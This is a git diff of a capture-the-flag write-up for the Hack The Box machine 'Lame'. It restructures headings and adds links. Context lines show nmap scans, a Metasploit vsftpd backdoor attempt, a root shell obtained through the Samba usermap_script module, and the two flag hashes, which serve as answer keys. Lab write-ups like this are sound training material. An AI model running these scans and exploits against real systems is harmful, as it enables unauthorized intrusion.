@@ -1,7 +1,8 @@
 ## Lame 10.10.10.3
 ### 0. Refs
   + https://www.youtube.com/watch?v=Ru8YxARNS7M
-### 1. Recon
+  + [HTB's writeup](./Lame.pdf)
+### 1. Enumeration
 - Run nmap and output to file txt:
 ```
 $ nmap -sV -A -oN 10.10.10.3.txt 10.10.10.3
@@ -53,7 +54,7 @@ HOP RTT      ADDRESS
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 73.92 seconds
 ```
-- Run Zenmap (nmap with GUI) using the default command:
+- Run Zenmap (nmap with GUI) using the default command (see [output](./zenmap_output.pdf)):
 ```
 nmap -T4 -A -v 10.10.10.3
 ```
@@ -63,7 +64,8 @@ nmap -T4 -A -v 10.10.10.3
   + 139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
   + 445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
 
-### 2. vsftp 2.3.4
+## 2. Exploitation
+### A. vsftp 2.3.4
 - Install fpt
 ```
 $ sudo apt install ftp
@@ -170,7 +172,7 @@ msf5 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
 
 [*] Exploit completed, but no session was created.
  ```
- ### 3. Samba 3.0.20
+ ### B. Samba 3.0.20
  - Refs:
     + https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script
     + https://resources.infosecinstitute.com/hacking-and-gaining-access-to-linux-by-exploiting-samba-service/#gref
@@ -276,7 +278,7 @@ sh-3.2# cat root/root.txt
 cat root/root.txt
 92caac3be140ef409e45721348a4e9df
  ```
-### 4. Flags
+## 3. Flags
 `69454a937d94f5f0225ea00acd2e84c5` and `92caac3be140ef409e45721348a4e9df`
 
 
